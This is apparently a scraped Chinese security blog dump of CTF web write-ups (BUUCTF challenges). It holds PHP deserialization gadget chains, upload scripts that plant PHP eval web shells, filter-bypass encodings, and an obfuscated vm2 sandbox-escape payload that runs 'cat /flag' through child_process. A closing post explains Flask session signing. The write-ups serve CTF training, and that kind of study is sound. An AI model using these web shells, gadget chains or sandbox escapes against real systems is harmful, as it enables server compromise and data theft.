&amp;&amp; $_GET['debu'] !== 'aqua_is_cute') &#123; $file = $_GET[\"file\"]; echo \"Neeeeee! Good Job!&lt;br&gt;\"; &#125; &#125; else die('fxck you! What do you want to do ?!');if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); &#125; &#125; if (file_get_contents($file) !== 'debu_debu_aqua') die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;\");if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[\"flag\"]); echo \"Very good! you know my password. But what is flag?&lt;br&gt;\";&#125; else&#123; die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");&#125;if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) &#123; die(\"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); &#125; else &#123; include \"flag.php\"; $code('', $arg); &#125; ?&gt; [强网杯 2019]Upload存在：/www.tar.gz Profile.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Profile extends Controller&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() &#123; $this-&gt;checker=new Index(); $this-&gt;upload_menu=md5($_SERVER['REMOTE_ADDR']); @chdir(\"../public/upload\"); if(!is_dir($this-&gt;upload_menu))&#123; @mkdir($this-&gt;upload_menu); &#125; @chdir($this-&gt;upload_menu); &#125; public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).\".png\"; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error('Forbidden type!', url('../index')); &#125; &#125;else&#123; $this-&gt;error('Unknow file type!', url('../index')); &#125; &#125; public function update_img()&#123; $user_info=db('user')-&gt;where(\"ID\",$this-&gt;checker-&gt;profile['ID'])-&gt;find(); if(empty($user_info['img']) &amp;&amp; $this-&gt;img)&#123; if(db('user')-&gt;where('ID',$user_info['ID'])-&gt;data([\"img\"=&gt;addslashes($this-&gt;img)])-&gt;update())&#123; $this-&gt;update_cookie(); $this-&gt;success('Upload img successful!', url('../home')); &#125;else&#123; $this-&gt;error('Upload file failed!', url('../index')); &#125; &#125; &#125; public function update_cookie()&#123; $this-&gt;checker-&gt;profile['img']=$this-&gt;img; cookie(\"user\",base64_encode(serialize($this-&gt;checker-&gt;profile)),3600); &#125; public function ext_check()&#123; $ext_arr=explode(\".\",$this-&gt;filename); $this-&gt;ext=end($ext_arr); if($this-&gt;ext==\"png\")&#123; return 1; &#125;else&#123; return 0; &#125; &#125; public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125;&#125; payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace app\\web\\controller;class Profile&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125;&#125;class Register&#123; public $checker; public $registed; public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125;&#125;$p=new Profile();$r=new Register();$p-&gt;img=\"upload_img\";$p-&gt;except=[\"index\"=&gt;\"img\"];$p-&gt;ext=\"png\";$p-&gt;filename_tmp=\"../public/upload/d99081fe929b750e0557f85e6499103f/0fd406e401da2c937bd181b6c16c0083.png\";$p-&gt;filename=\"../public/upload/d99081fe929b750e0557f85e6499103f/0fd406e401da2c937bd181b6c16c0083.php\";$r-&gt;checker=$p;$r-&gt;registed=false;echo urlencode(base64_encode(serialize($r)));?&gt; [网鼎杯2018]Unfinish[GYCTF2020]Easyphp[MRCTF2020]Ezaudit[GXYCTF2019]StrongestMind保持同一会话运算一千次 1234567891011121314151617181920from requests import *import reurl = \"http://3966ac42-b1a5-413c-851a-a241e5fa25ff.node3.buuoj.cn/index.php\"s = session()rr = re.compile(r\"[0-9]+ [+|-] [0-9]+\")r = s.get(url)r.encoding = \"utf-8\"data = &#123;\"answer\":eval(rr.findall(r.text)[0])&#125;r = s.post(url,data=data)for i in range(1000): answer = eval(rr.findall(r.text)[0]) data = &#123; \"answer\" : answer &#125; r = s.post( url , data=data) r.encoding = \"utf-8\" print('[+%d]:'%(i) + str(answer))print(r.text) [安洵杯 2019]不是文件上传12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?phpclass helper &#123; protected $folder = \"pic/\"; protected $ifview = False; protected $config = \"config.txt\"; // The function is not yet perfect, it is not open yet. public function upload($input=\"file\") &#123; $fileinfo = $this-&gt;getfile($input); $array = array(); $array[\"title\"] = $fileinfo['title']; $array[\"filename\"] = $fileinfo['filename']; $array[\"ext\"] = $fileinfo['ext']; $array[\"path\"] = $fileinfo['path']; $img_ext = getimagesize($_FILES[$input][\"tmp_name\"]); $my_ext = array(\"width\"=&gt;$img_ext[0],\"height\"=&gt;$img_ext[1]); $array[\"attr\"] = serialize($my_ext); $id = $this-&gt;save($array); if ($id == 0)&#123; die(\"Something wrong!\"); &#125; echo \"&lt;br&gt;\"; echo \"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;\"; &#125; public function getfile($input) &#123; if(isset($input))&#123; $rs = $this-&gt;check($_FILES[$input]); &#125; return $rs; &#125; public function check($info) &#123; $basename = substr(md5(time().uniqid()),9,16); $filename = $info[\"name\"]; $ext = substr(strrchr($filename, '.'), 1); $cate_exts = array(\"jpg\",\"gif\",\"png\",\"jpeg\"); if(!in_array($ext,$cate_exts))&#123; die(\"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;\"); &#125; $title = str_replace(\".\".$ext,'',$filename); return array('title'=&gt;$title,'filename'=&gt;$basename.\".\".$ext,'ext'=&gt;$ext,'path'=&gt;$this-&gt;folder.$basename.\".\".$ext); &#125; public function save($data) &#123; if(!$data || !is_array($data))&#123; die(\"Something wrong!\"); &#125; $id = $this-&gt;insert_array($data); return $id; &#125; public function insert_array($data) &#123; $con = mysqli_connect(\"127.0.0.1\",\"r00t\",\"r00t\",\"pic_base\"); if (mysqli_connect_errno($con)) &#123; die(\"Connect MySQL Fail:\".mysqli_connect_error()); &#125; $sql_fields = array(); $sql_val = array(); foreach($data as $key=&gt;$value)&#123; $key_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $key); $value_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $value); $sql_fields[] = \"`\".$key_temp.\"`\"; $sql_val[] = \"'\".$value_temp.\"'\"; &#125; $sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\"; mysqli_query($con, $sql); $id = mysqli_insert_id($con); mysqli_close($con); return $id; &#125; public function view_files($path)&#123; if ($this-&gt;ifview == False)&#123; return False; //The function is not yet perfect, it is not open yet. &#125; $content = file_get_contents($path); echo $content; &#125; function __destruct()&#123; # Read some config html $this-&gt;view_files($this-&gt;config); &#125;&#125;?&gt; show.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpinclude(\"./helper.php\");$show = new show();if($_GET[\"delete_all\"])&#123; if($_GET[\"delete_all\"] == \"true\")&#123; $show-&gt;Delete_All_Images(); &#125;&#125;$show-&gt;Get_All_Images();class show&#123; public $con; public function __construct()&#123; $this-&gt;con = mysqli_connect(\"127.0.0.1\",\"r00t\",\"r00t\",\"pic_base\"); if (mysqli_connect_errno($this-&gt;con))&#123; die(\"Connect MySQL Fail:\".mysqli_connect_error()); &#125; &#125; public function Get_All_Images()&#123; $sql = \"SELECT * FROM images\"; $result = mysqli_query($this-&gt;con, $sql); if ($result-&gt;num_rows &gt; 0)&#123; while($row = $result-&gt;fetch_assoc())&#123; if($row[\"attr\"])&#123; $attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]); $attr = unserialize($attr_temp); &#125; echo \"&lt;p&gt;id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"&lt;/p&gt;\"; &#125; &#125;else&#123; echo \"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;\"; &#125; mysqli_close($this-&gt;con); &#125; public function Delete_All_Images()&#123; $sql = \"DELETE FROM images\"; $result = mysqli_query($this-&gt;con, $sql); &#125;&#125;?&gt; upload.php 12345678910111213141516171819&lt;?phpinclude(\"./helper.php\");class upload extends helper &#123; public function upload_base()&#123; $this-&gt;upload(); &#125;&#125;if ($_FILES)&#123; if ($_FILES[\"file\"][\"error\"])&#123; die(\"Upload file failed.\"); &#125;else&#123; $file = new upload(); $file-&gt;upload_base(); &#125;&#125;$a = new helper();?&gt; show.php有对图片的宽和高反序列化操作，不过，图片的宽和高我们无法控制，唯一可以控制的只有title参数，这里存在着insert注入。 123456789&lt;?phpclass helper&#123; protected $ifview = True; protected $config = \"/flag\";&#125;$s=serialize(new helper());echo str_replace(chr(0).'*'.chr(0),'\\0\\0\\0',$s);# O:6:\"helper\":2:&#123;s:9:\"\\0\\0\\0ifview\";b:1;s:9:\"\\0\\0\\0config\";s:5:\"/flag\";&#125; 因为上传的文件名中不能有双引号，所以将payload进行16进制编码。 [RoarCTF 2019]Simple Upload12345678910111213141516171819202122232425262728293031323334&lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller&#123; public function index() &#123; show_source(__FILE__); &#125; public function upload() &#123; $uploadFile = $_FILES['file'] ; if (strstr(strtolower($uploadFile['name']), \".php\") ) &#123; return false; &#125; $upload = new \\Think\\Upload();// 实例化上传类 $upload-&gt;maxSize = 4096 ;// 设置附件上传大小 $upload-&gt;allowExts = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型 $upload-&gt;rootPath = './Public/Uploads/';// 设置附件上传目录 $upload-&gt;savePath = '';// 设置附件上传子目录 $info = $upload-&gt;upload() ; if(!$info) &#123;// 上传错误提示错误信息 $this-&gt;error($upload-&gt;getError()); return; &#125;else&#123;// 上传成功 获取上传文件信息 $url = __ROOT__.substr($upload-&gt;rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; echo json_encode(array(\"url\"=&gt;$url,\"success\"=&gt;1)); &#125; &#125;&#125; 12345678910 $uploadFile = $_FILES['file'] ; if (strstr(strtolower($uploadFile['name']), \".php\") ) &#123; return false; &#125;``` 这个部分只会检测上传的文件file的后缀，而不会检测其他上传的文件的后缀。而upload函数本省是可以批量上传的。原题中： $upload-&gt;allowExts = array(‘jpg’, ‘gif’, ‘png’, ‘jpeg’);// 设置附件上传类型这里设置是无效的，thinkphp 3.2中设置允许上传的文件后缀应该写为： $upload-&gt;exts = array(‘jpg’, ‘gif’, ‘png’, ‘jpeg’);// 设置附件上传类型 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253此处摘抄自thinkphp3.2官网综上，压根就没有对上传文件做严格的检测，我们甚至只需要上传一个input标签name值不为file都行，只是这样的话，后端不会返回文件路径，所以需要上传一个正常的图片来猜测uniqid函数返回文件路径的大致范围。方法一:&#96;&#96;&#96;phpimport requestsimport timeimport json#上传文件url &#x3D; &#39;http:&#x2F;&#x2F;e54d31dd-efb4-45da-8512-f7387193b5a6.node3.buuoj.cn&#x2F;index.php&#x2F;Home&#x2F;Index&#x2F;upload&#39;file1 &#x3D; &#123;&#39;file&#39;:(&#39;1.txt&#39;,&#39;r&#39;)&#125;file2 &#x3D; &#123;&#39;file[]&#39;:(&#39;1.php&#39;,&#39;r&#39;)&#125; #upload()不传参时即是批量上传所以用[]r &#x3D; requests.post(url,files &#x3D; file1)print(r.text)r &#x3D; requests.post(url,files &#x3D; file2)print(r.text)r &#x3D; requests.post(url, files &#x3D; file1)print(r.text)#猜测文件位置url &#x3D; &quot;http:&#x2F;&#x2F;e54d31dd-efb4-45da-8512-f7387193b5a6.node3.buuoj.cn&#x2F;&quot;path &#x3D; url + &quot;&#x2F;index.php&#x2F;home&#x2F;index&#x2F;upload&quot;files &#x3D; &#123;&quot;file&quot;:(&quot;a.txt&quot;,&#39;a&#39;), &quot;file1&quot;:(&quot;b.php&quot;, &#39;&lt;?php eval($_GET[&quot;a&quot;]);&#39;)&#125;r &#x3D; requests.post(path, files&#x3D;files)t1 &#x3D; r.text.split(&quot;&#x2F;&quot;)[-1].split(&quot;.&quot;)[0]param&#x3D;json.loads(r.content)print(param)t1 &#x3D; int(t1, 16)j &#x3D; t1while True: path &#x3D; url + &quot;&#x2F;Public&#x2F;Uploads&#x2F;&quot;+param[&#39;url&#39;].split(&quot;&#x2F;&quot;)[-2]+&quot;&#x2F;%s.php&quot; % hex(j)[2:] try: r &#x3D; requests.get(path,timeout&#x3D;1) except: continue if r.status_code &#x3D;&#x3D; 429:#规避过于频繁访问导致的429 time.sleep(0.1) continue elif r.status_code !&#x3D; 404: print(path) print(r.text) break #print(j, path, r.status_code) j -&#x3D; 1 方法二： 1234567import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;e54d31dd-efb4-45da-8512-f7387193b5a6.node3.buuoj.cn&#x2F;index.php&#x2F;home&#x2F;index&#x2F;upload&#x2F;&quot;s &#x3D; requests.Session()files &#x3D; &#123;&quot;file&quot;: (&quot;shell.&lt;&gt;php&quot;, &quot;&lt;?php eval($_GET[&#39;cmd&#39;])?&gt;&quot;)&#125;r &#x3D; requests.post(url, files&#x3D;files)print(r.text) [SUCTF 2018]GetShell[HarekazeCTF2019]Avatar Uploader 1123456789101112131415161718// check file type$finfo = finfo_open(FILEINFO_MIME_TYPE);$type = finfo_file($finfo, $_FILES['file']['tmp_name']);finfo_close($finfo);if (!in_array($type, ['image/png'])) &#123; error('Uploaded file is not PNG format.');&#125;// check file width/height$size = getimagesize($_FILES['file']['tmp_name']);if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123; error('Uploaded image is too large.');&#125;if ($size[2] !== IMAGETYPE_PNG) &#123; // I hope this never happens... error('What happened...? OK, the flag for part 1 is: &lt;code&gt;' . getenv('FLAG1') . '&lt;/code&gt;');&#125; 用finfo去判断图片类型。必须是image/png接着用getimagesize去判断图片大小并且图片类型不能是PNG 图片破坏后。只留下一个文件头。getimagesize就读取不到它的文件宽高和类型了那么就可以绕过getimagesize的判断而finfo_file照样可以识别出这是个PNG图片 。 [DDCTF 2019]homebrew event loop1?action:trigger_event%23;action:buy;5%23action:get_flag; https://www.cnblogs.com/wangtanzhi/p/12309335.html UserController.php 12345678910class UserController extends BaseController&#123;…… public function actionIndex() &#123; $listData = $_REQUEST; $this-&gt;loadView('userIndex',$listData); &#125;&#125; BaseController.php,loadView存在变量覆盖 12345678910111213141516171819class BaseController&#123; /* * 加载视图文件 * viewName 视图名称 * viewData 视图分配数据 */ private $viewPath; public function loadView($viewName ='', $viewData = []) &#123; $this-&gt;viewPath = BASE_PATH . \"/View/&#123;$viewName&#125;.php\"; if(file_exists($this-&gt;viewPath)) &#123; extract($viewData); include $this-&gt;viewPath; &#125; &#125; &#125; userIndex.php 此次存在文件读取，可利用上面的变量覆盖，将$img_file赋值为flag.php 12345678&lt;?php if(!isset($img_file)) &#123; $img_file = '/../favicon.ico'; &#125; $img_dir = dirname(__FILE__) . $img_file; $img_base64 = imgToBase64($img_dir); echo '&lt;img src=\"' . $img_base64 . '\"&gt;'; //图片形式展示 ?&gt; [CISCN2019 华东北赛区]Web2[ISITDTU 2019]EasyPHP123456789101112&lt;?phphighlight_file(__FILE__);$_ = @$_GET['_'];if ( preg_match('/[\\x00- 0-9\\'\"`$&amp;.,|[&#123;_defgops\\x7F]+/i', $_) ) die('rosé will not do it');if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die('you are so close, omg');eval($_);?&gt; 解题 123\\x00- 0-9 匹配\\x00到空格(\\x20)，0-9的数字'\"`$&amp;.,|[&#123;_defgops 匹配这些字符\\x7F 匹配DEL(\\x7F)字符 匹配到以上字符就die掉 12if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die('you are so close, omg'); 当mode=3: 会返回包含所有用过的不同字符的字符串,这里不能超过13种字符 先看一下有哪些内置函数可以使用 12345678&lt;?php$array=get_defined_functions();print_r($array);foreach($array['internal'] as $arr)&#123; if ( preg_match('/[\\x00- 0-9\\'\"\\`$&amp;.,|[&#123;_defgops\\x7F]+/i', $arr) ) continue; if ( strlen(count_chars(strtolower($arr), 0x3)) &gt; 0xd ) continue; print($arr.\"\\n\");&#125; result 123456789101112131415bcmulrtrimtrimltrimchrlinkunlinktanatanatanhtanhintvalmailminmax 使用异或绕过 12C:\\Users\\Administrator&gt;php -r \"echo urlencode(~'phpinfo');\"%8F%97%8F%96%91%99%90","categories":[],"tags":[]},{"title":"vm2沙箱逃匿","slug":"vm2沙箱逃匿","date":"2021-05-01T06:31:00.000Z","updated":"2021-05-02T14:34:16.388Z","comments":true,"path":"article/4994bd52.html","link":"","permalink":"https://blog.cfyqy.com/article/4994bd52.html","excerpt":"vm是nodejs实现的一个沙箱环境，但是官方文档并不推荐使用vm来运行不可信任的代码，vm2则是一个npm包，在vm的基础上，通过es6新增的代理机制，来拦截对外部属性的访问。","text":"vm是nodejs实现的一个沙箱环境，但是官方文档并不推荐使用vm来运行不可信任的代码，vm2则是一个npm包，在vm的基础上，通过es6新增的代理机制，来拦截对外部属性的访问。 es6 vmvm2是在vm的基础上实现的沙箱，所以内部调用的还是vm的API，在vm中运行一个沙箱环境： 相应的代码： 12345678910111213141516const vm = require('vm');const context = &#123; animal: 'cat', count: 2&#125;;const script = new vm.Script('count += 1; name = \"kitty\";'); //编译codevm.createContext(context); // 创建一个上下文隔离对象for (let i = 0; i &lt; 10; ++i) &#123; script.runInContext(context); // 在指定的下文里执行code并返回其结果&#125;console.log(context);// 打印: &#123; animal: 'cat', count: 12, name: 'kitty' &#125; 将代码编译为 script，然后创建一个上下文 vm.createContext(context) ，最后我们将编译好的脚本放在一个上下文中运行 script.runInContext 当然也可以不用那么麻烦，直接在沙箱中运行一段代码 12const vm = require(\"vm\");console.log(vm.runInNewContext(\"let a = 2;a\")); //2 如果不提供上下文变量，那么vm会自己创建一个隔离的上下文context。 显而易见，vm中最关键的就是 上下文context ，vm能逃逸出来的原理也就是因为 context 并没有拦截针对外部的 constructor 和__proto__等属性 的访问 vm2vm2相比vm做了很大的改进，其中之一就是利用了es6新增的 proxy 特性，从而拦截对诸如 constructor 和 __proto__ 这些属性的访问 在vm2 中运行一段代码，如下 1234567const &#123;VM, VMScript&#125; = require(\"vm2\");const script = new VMScript(\"let a = 2;a\");let vm = new VM();console.log(vm.run(script)); 其中 VM 是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化之后调用 run 方法即可运行一段脚本。 运行的代码和vm2对应的实现： 例题[HFCTF2020]JustEscape假的PHP 12345678&lt;?phpif( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#39;code&#39; ] !&#x3D; NULL ) &#123; $code &#x3D; $_GET[&#39;code&#39;]; echo eval(code);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; 输入Error().stack 1run.php?code&#x3D;Error().stack 报vm2错误 1Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (&#x2F;app&#x2F;node_modules&#x2F;vm2&#x2F;lib&#x2F;main.js:219:62) at &#x2F;app&#x2F;server.js:51:33 at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at next (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13) at Route.dispatch (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3) at Layer.handle [as handle_request] (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5) at &#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22 at Function.process_params (&#x2F;app&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12) https://github.com/patriksimek/vm2/issues/225 fuzz 一下，有 for, while, process, exec, eval, constructor, prototype, Function, 加号, 双引号, 单引号被过滤了。 可以利用字符串拼接和数组调用（对象的方法或者属性名关键字被过滤的情况下可以把对象当成一个数组，然后数组里面的键名用字符串拼接出来）的方式来绕过关键字的限制，但注意到单双引号和加号同时被过滤了，我们想要直接输入字符串拼接的话似乎也行不通了。这里我们可以利用反引号来把文本括起来作为字符串 https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings，同时我们也可以利用模板字符串嵌套来拼接出我们想要的被过滤了的字符串。 比如这里 prototype 被过滤了，我们可以这样书写 1&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96; 这样就可以拼接出一个 prototype 字符串,最后payload 12345678(function ()&#123; TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)(); try&#123; Object.preventExtensions(Buffer.from(``)).a = 1; &#125;catch(e)&#123; return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString(); &#125;&#125;)() 读取一下题目的源码server.js 12345678910111213141516171819202122232425262728293031323334353637383940const express = require('express');const app = express();const &#123; VM&#125; = require('vm2');const error = ``;app.use(express.static('public'));app.get('/',function(req, res) &#123; res.sendFile(__dirname + \"/\" + \"index.html\");&#125;);app.get('/index.php',function(req, res) &#123; res.sendFile(__dirname + \"/\" + \"php.html\");&#125;);app.get('/run.php',function(req, res) &#123; const code = req.query.code; try &#123; if (!code) &#123; res.sendFile(__dirname + \"/\" + \"php.html\"); return; &#125; const blacklists = ['for', 'while', 'process', 'exec', 'eval', 'constructor', 'prototype', 'Function', '+', '\"', '\\'']; if (blacklists.map(v = &gt;code.includes(v)).filter(v = &gt;v).length !== 0) &#123; res.send(error); return; &#125; const result = new VM().run(code); res.send(result.toString()); &#125; catch(ex) &#123; res.send(ex.toString()); &#125;&#125;);const server = app.listen(3000,function() &#123; const host = server.address().address; const port = server.address().port; console.log(\"app listening at http://%s:%s\", host, port);&#125;); 参考文章： vm2实现原理分析vm2沙箱逃逸分析https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy","categories":[],"tags":[],"author":"ye1s"},{"title":"flask的session问题","slug":"flask的session问题","date":"2021-04-26T14:52:13.000Z","updated":"2021-04-26T15:42:41.344Z","comments":true,"path":"article/ca41ddf0.html","link":"","permalink":"https://blog.cfyqy.com/article/ca41ddf0.html","excerpt":"Flask的session是存储在客户端的(可以通过HTTP请求头Cookie字段的session获取)，Flask只对数据进行了签名(防篡改)没有进行加密，session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。","text":"Flask的session是存储在客户端的(可以通过HTTP请求头Cookie字段的session获取)，Flask只对数据进行了签名(防篡改)没有进行加密，session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。 session机制详细可以看此文章：flask 源码解析：session引用p师傅的分析 1234567891011121314151617181920212223242526272829303132333435363738394041class SecureCookieSessionInterface(SessionInterface): serializer = session_json_serializer session_class = SecureCookieSession def get_signing_serializer(self, app): if not app.secret_key: return None signer_kwargs = dict( key_derivation=self.key_derivation, digest_method=self.digest_method ) return URLSafeTimedSerializer(app.secret_key, salt=self.salt, serializer=self.serializer, signer_kwargs=signer_kwargs) def open_session(self, app, request): s = self.get_signing_serializer(app) if s is None: return None val = request.cookies.get(app.session_cookie_name) if not val: return self.session_class() max_age = total_seconds(app.permanent_session_lifetime) try: data = s.loads(val, max_age=max_age) return self.session_class(data) except BadSignature: return self.session_class() def save_session(self, app, session, response): domain = self.get_cookie_domain(app) path = self.get_cookie_path(app) if not self.should_set_cookie(app, session): return httponly = self.get_cookie_httponly(app) secure = self.get_cookie_secure(app) expires = self.get_expiration_time(app, session) val = self.get_signing_serializer(app).dumps(dict(session)) response.set_cookie(app.session_cookie_name, val, expires=expires, httponly=httponly, domain=domain, path=path, secure=secure) 主要看最后两行代码，新建了URLSafeTimedSerializer类 ，用它的dumps方法将类型为字典的session对象序列化成字符串，然后用response.set_cookie将最后的内容保存在cookie中。URLSafeTimedSerialize 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879class Signer(object): # ... def sign(self, value): \"\"\"Signs the given string.\"\"\" return value + want_bytes(self.sep) + self.get_signature(value) def get_signature(self, value): \"\"\"Returns the signature for the given value\"\"\" value = want_bytes(value) key = self.derive_key() sig = self.algorithm.get_signature(key, value) return base64_encode(sig)class Serializer(object): default_serializer = json default_signer = Signer # .... def dumps(self, obj, salt=None): \"\"\"Returns a signed string serialized with the internal serializer. The return value can be either a byte or unicode string depending on the format of the internal serializer. \"\"\" payload = want_bytes(self.dump_payload(obj)) rv = self.make_signer(salt).sign(payload) if self.is_text_serializer: rv = rv.decode('utf-8') return rv def dump_payload(self, obj): \"\"\"Dumps the encoded object. The return value is always a bytestring. If the internal serializer is text based the value will automatically be encoded to utf-8. \"\"\" return want_bytes(self.serializer.dumps(obj))class URLSafeSerializerMixin(object): \"\"\"Mixed in with a regular serializer it will attempt to zlib compress the string to make it shorter if necessary. It will also base64 encode the string so that it can safely be placed in a URL. \"\"\" def load_payload(self, payload): decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: json = base64_decode(payload) except Exception as e: raise BadPayload('Could not base64 decode the payload because of ' 'an exception', original_error=e) if decompress: try: json = zlib.decompress(json) except Exception as e: raise BadPayload('Could not zlib decompress the payload before ' 'decoding the payload', original_error=e) return super(URLSafeSerializerMixin, self).load_payload(json) def dump_payload(self, obj): json = super(URLSafeSerializerMixin, self).dump_payload(obj) is_compressed = False compressed = zlib.compress(json) if len(compressed) &lt; (len(json) - 1): json = compressed is_compressed = True base64d = base64_encode(json) if is_compressed: base64d = b'.' + base64d return base64dclass URLSafeTimedSerializer(URLSafeSerializerMixin, TimedSerializer): \"\"\"Works like :class:`TimedSerializer` but dumps and loads into a URL safe string consisting of the upper and lowercase character of the alphabet as well as ``'_'``, ``'-'`` and ``'.'``. \"\"\" default_serializer = compact_json 主要关注dump_payload、dumps，这是序列化session的主要过程。 可见，序列化的操作分如下几步： json.dumps 将对象转换成json字符串，作为数据 如果数据压缩后长度更短，则用zlib库进行压缩 将数据用base64编码 通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割 第4步就解决了用户篡改session的问题，因为在不知道secret_key的情况下，是无法伪造签名的。 session解密session 在 cookie 中的值，是一个字符串，由句号分割成三个部分。第一部分是 base64 加密的数据，第二部分是时间戳，第三部分是校验信息。 12345678910111213from itsdangerous import *import times = \"eyJ1c2VybmFtZSI6InllMXMifQ.XxU53w.L7_pVjkrwxpqtG1r8_RwZvMMWK0\"data,timestamp,secret = s.split('.')print(\"data: \",base64_decode(data))time_stamp=int.from_bytes(base64_decode(timestamp),byteorder='big')time=time.strftime(\"%Y-%m-%d %H:%I%S\",time.localtime(time_stamp))print(\"time: \",time)result: data: b'&#123;\"username\":\"ye1s\"&#125;'time: 2020-07-20 14:0251 P师傅的脚本解密 12345678910111213141516171819202122232425262728293031import zlibfrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b'.', 1) payload, timestamp = payload.rsplit(b'.', 1) decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception('Could not base64 decode the payload because of ' 'an exception') if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception('Could not zlib decompress the payload before ' 'decoding the payload') return session_json_serializer.loads(payload)if __name__ == '__main__': s=\"eyJ1c2VybmFtZSI6InllMXMifQ.XxU53w.L7_pVjkrwxpqtG1r8_RwZvMMWK0\"#替换为你的session字符串 print(decryption(s.encode())) 例题[HCTF 2018]admin随便注册一个账号登录，在修改密码的地方，提示源码 